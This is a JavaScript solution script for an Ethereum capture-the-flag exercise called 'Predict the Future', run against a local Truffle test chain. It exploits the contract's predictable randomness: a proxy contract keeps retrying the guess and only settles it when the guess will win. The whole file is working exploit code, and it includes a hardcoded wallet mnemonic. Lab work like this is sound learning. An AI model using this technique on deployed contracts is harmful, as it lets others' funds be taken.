/**
 * INSTRUCTIONS
 *
 * 1. Start development network by running `truffle development`
 * 2. Copy mnemonic to the variable below and double-check localhost port is correct
 * 3. Run migration in development and re-execute all the steps: `truffle migrate --reset`
 * 4. Copy guess and proxy recently created contract addresses to the variables below
 * 5. Run this file with both 1st and 2nd steps
 * 6. If there is a "revert" - which is likely - run 2nd step only until it doesn't fail, voilá.
 *
 * SOLUTION
 *
 * ProxyContract will only "settle" the answer once we're sure the answer will be right.
 *
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:9545",
});

const web3 = new Web3(provider);

const predictAbi = JSON.parse(
  fs.readFileSync(
    "./5_predict_the_future_local/build/contracts/PredictTheFutureChallenge.json"
  )
).abi;

const proxyAbi = JSON.parse(
  fs.readFileSync("./5_predict_the_future_local/build/contracts/ProxyContract.json")
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const predictContractAddress = "0xE9548c10A72F50C8BDc9b422d97d91AC7296C110";
const proxyContractAddress = "0x940FA82FE7C75270DBaB1A1a2fbdC4960C750F12";

const outputBalances = (userAccount) => {
  web3.eth.getBalance(userAccount, (_, balance) => {
    console.log("Account balance: " + Web3Utils.fromWei(balance, "ether"));
  });
  web3.eth.getBalance(predictContractAddress, (_, balance) => {
    console.log(
      "PredictContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
  web3.eth.getBalance(proxyContractAddress, (_, balance) => {
    console.log(
      "ProxyContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
};

const tentativeInterval = 100;
const guess = 9;

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

const advanceBlock = () => {
  return new Promise((resolve, reject) => {
    web3.currentProvider.sendAsync({
      jsonrpc: "2.0",
      method: "evm_mine",
      id: new Date().getTime()
    }, (err, result) => {
      return err ? reject(err) : resolve(result);
    });
  });
}

const runTentative = async (account, proxyContract) => {
  /**
   * If we're very lucky the algorithm can actually pass by only running once.
   * But it's likely we'll need a few more tentatives (no ether will be consumed only gas).
   */
  await advanceBlock();
  console.log("New block hash: " + (await web3.eth.getBlock('latest')).number);

  try {
    const gasPrice = await proxyContract.methods
      .tryWin(predictContractAddress)
      .estimateGas({ from: account });

    console.log('Gas amount:' + gasPrice);

    const nestedRes = await proxyContract.methods
      .tryWin(predictContractAddress)
      .send({ from: account, gasPrice });

    console.log(nestedRes);

    const predictContract = new web3.eth.Contract(
      predictAbi,
      predictContractAddress
    );
    // did guess contract consider the answer correct?
    predictContract.methods
      .isComplete()
      .call()
      .then((res) => console.log("Is complete: " + res));

    // return ether expenses to original account
    await proxyContract.methods
      .destroy()
      .send({ from: account, gasPrice });    // use last gasPrice to simplify

    outputBalances(account);
    return true;
  }
  catch (err) {
    console.warn(err.message);
    return false;
  }
}

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const amountToSend = Web3Utils.toWei("1", "ether");
    let gasPrice;
    let keepTrying = true;

    outputBalances(accounts[0]);

    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);

    gasPrice = await proxyContract.methods
      .lockInGuess(guess, predictContractAddress)
      .estimateGas({ from: accounts[0], value: amountToSend });

    console.log('Gas amount:' + gasPrice);

    const res = await proxyContract.methods
      .lockInGuess(guess, predictContractAddress)
      .send({ from: accounts[0], value: amountToSend, gasPrice });

    console.log(res);

    // advance the block by two otherwise require in Predict contract will not pass
    console.log("Block hash: " + (await web3.eth.getBlock('latest')).number);
    await advanceBlock();

    while (keepTrying) {
      const isGuessMatchingAnswer = await runTentative(accounts[0], proxyContract);
      if (isGuessMatchingAnswer) {
        keepTrying = false;
      }
      else {
        // TODO ideally we should only wait for the difference between the time already
        // spent waiting for network calls and the tentativeInterval
        await delay(tentativeInterval);
      }
    }

  } catch (err) {
    console.error(err);
  } finally {
    provider.engine.stop();
  }
}

main();
